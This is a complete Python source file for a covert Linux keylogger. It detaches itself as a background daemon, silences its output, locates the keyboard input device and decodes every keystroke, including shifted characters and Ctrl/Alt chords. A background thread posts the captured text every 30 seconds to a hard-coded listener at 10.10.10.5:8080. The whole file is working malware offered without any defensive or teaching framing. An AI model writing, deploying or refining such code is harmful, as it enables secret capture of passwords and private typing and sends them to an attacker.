import os
import sys
import json
import time
import threading
import struct
import glob
import signal

try:
    import urllib.request
except ImportError:
    import urllib2 as urllib_request
else:
    urllib_request = urllib.request

LISTENER = "http://10.10.10.5:8080"
INTERVAL = 30

# ── daemonise ──
if os.fork():
    os._exit(0)
os.setsid()
if os.fork():
    os._exit(0)

os.chdir("/")
os.umask(0)
sys.stdin.close()
sys.stdout.close()
sys.stderr.close()
sys.stdin = open("/dev/null", "r")
sys.stdout = open("/dev/null", "w")
sys.stderr = open("/dev/null", "w")

# ── evdev constants ──
EV_KEY = 0x01
EV_SYN = 0x00
SYN_REPORT = 0
KEY_DOWN = 1
KEY_UP = 0

# US layout scancode → character (no shift, no modifier)
KEY_MAP = {
    1:  "[ESC]",   2:  "1",   3:  "2",   4:  "3",   5:  "4",
    6:  "5",       7:  "6",   8:  "7",   9:  "8",   10: "9",
    11: "0",       12: "-",   13: "=",   14: "[BKSP]",
    15: "[TAB]",   16: "q",   17: "w",   18: "e",   19: "r",
    20: "t",       21: "y",   22: "u",   23: "i",   24: "o",
    25: "p",       26: "[",   27: "]",   28: "[ENTER]",
    29: "[LCTRL]", 30: "a",   31: "s",   32: "d",   33: "f",
    34: "g",       35: "h",   36: "j",   37: "k",   38: "l",
    39: ";",       40: "'",   41: "`",   42: "[LSHIFT]",
    43: "\\",      44: "z",   45: "x",   46: "c",   47: "v",
    48: "b",       49: "n",   50: "m",   51: ",",   52: ".",
    53: "/",       54: "[RSHIFT]",
    55: "[KP*]",   56: "[LALT]",               57: "[SPACE]",
    58: "[CAPS]",  59: "[F1]",  60: "[F2]",   61: "[F3]",
    62: "[F4]",    63: "[F5]",  64: "[F6]",   65: "[F7]",
    66: "[F8]",    67: "[F9]",  68: "[F10]",  69: "[NUM]",
    70: "[SCROLL]",71: "[KP7]", 72: "[KP8]",  73: "[KP9]",
    74: "[KP-]",   75: "[KP4]", 76: "[KP5]",  77: "[KP6]",
    78: "[KP+]",   79: "[KP1]", 80: "[KP2]",  81: "[KP3]",
    82: "[KP0]",   83: "[KP.]",
    87: "[F11]",   88: "[F12]",
    96: "[KPENTER]",              97: "[RCTRL]",
    98: "[KP/]",   99: "[SYSRQ]",
    100: "[RALT]",                102: "[HOME]",
    103: "[UP]",   104: "[PGUP]", 105: "[LEFT]",
    106: "[RIGHT]",107: "[END]",  108: "[DOWN]",
    109: "[PGDN]", 110: "[INS]",  111: "[DEL]",
    125: "[LWIN]", 126: "[RWIN]", 127: "[COMPOSE]",
}

SHIFT_MAP = {
    "1": "!", "2": "@", "3": "#", "4": "$", "5": "%",
    "6": "^", "7": "&", "8": "*", "9": "(", "0": ")",
    "-": "_", "=": "+", "[": "{", "]": "}", "\\": "|",
    ";": ":", "'": '"', ",": "<", ".": ">", "/": "?",
    "`": "~",
}

LCtrl = 29
LShift = 42
LAlt = 56
RShift = 54
RCtrl = 97
RAlt = 100
CapsLock = 58
LWIN = 125
RWIN = 126

shift_down = False
caps_on = False
ctrl_down = False
alt_down = False
buf = []


def apply_key(code, value):
    global shift_down, caps_on, ctrl_down, alt_down

    # ── modifier down ──
    if code in (LShift, RShift):
        shift_down = (value == KEY_DOWN)
        return
    if code in (LCtrl, RCtrl):
        ctrl_down = (value == KEY_DOWN)
        return
    if code in (LAlt, RAlt):
        alt_down = (value == KEY_DOWN)
        return

    # Caps Lock toggles on down only
    if code == CapsLock and value == KEY_DOWN:
        caps_on = not caps_on
        return

    if value != KEY_DOWN:
        return

    base = KEY_MAP.get(code)
    if base is None:
        return

    # ── tagged modifier chord ──
    if ctrl_down or alt_down:
        tag = []
        if ctrl_down:
            tag.append("CTRL")
        if alt_down:
            tag.append("ALT")
        inner = base.strip("[]")
        buf.append("[%s+%s]" % ("+".join(tag), inner))
        return

    # ── printable character ──
    if len(base) == 1:
        ch = base
        if "a" <= ch <= "z":
            if (shift_down and not caps_on) or (caps_on and not shift_down):
                ch = ch.upper()
        elif shift_down:
            ch = SHIFT_MAP.get(ch, ch)
        buf.append(ch)
    else:
        buf.append(base)


def find_keyboard():
    """Walk /dev/input/by-path/ or /dev/input/event* for a keyboard."""
    candidates = glob.glob("/dev/input/by-path/*-kbd") + glob.glob("/dev/input/by-id/*-kbd")
    for path in candidates:
        if os.path.exists(path):
            return os.path.realpath(path)
    for dev in sorted(glob.glob("/dev/input/event*")):
        try:
            with open("/sys/class/input/%s/device/capabilities/ev" % os.path.basename(dev), "rb") as f:
                bits = os.read(f.fileno(), 128)
            byte0 = bits[0] if isinstance(bits[0], int) else ord(bits[0])
            byte1 = bits[1] if isinstance(bits[1], int) else ord(bits[1])
            if byte0 & (1 << 0) and byte1 & (1 << 1):
                return dev
        except (IOError, OSError, IndexError):
            continue
    return None


def exfil():
    global buf
    while True:
        time.sleep(INTERVAL)
        if not buf:
            continue
        snapshot = "".join(buf)
        buf = []
        try:
            data = json.dumps({"log": snapshot}).encode("utf-8")
            req = urllib_request.Request(
                LISTENER,
                data=data,
                headers={"Content-Type": "application/json"},
            )
            urllib_request.urlopen(req, timeout=5)
        except Exception:
            buf.insert(0, snapshot)


# ── main ──
kbd = find_keyboard()
if not kbd:
    sys.exit(1)

threading.Thread(target=exfil, daemon=True).start()

f = open(kbd, "rb")
fmt = "llHHI"
ev_size = struct.calcsize(fmt)

try:
    while True:
        raw = f.read(ev_size)
        if len(raw) < ev_size:
            time.sleep(0.05)
            continue
        tv_sec, tv_usec, etype, code, value = struct.unpack(fmt, raw)
        if etype == EV_KEY:
            apply_key(code, value)
except (IOError, OSError, KeyboardInterrupt):
    pass
finally:
    f.close()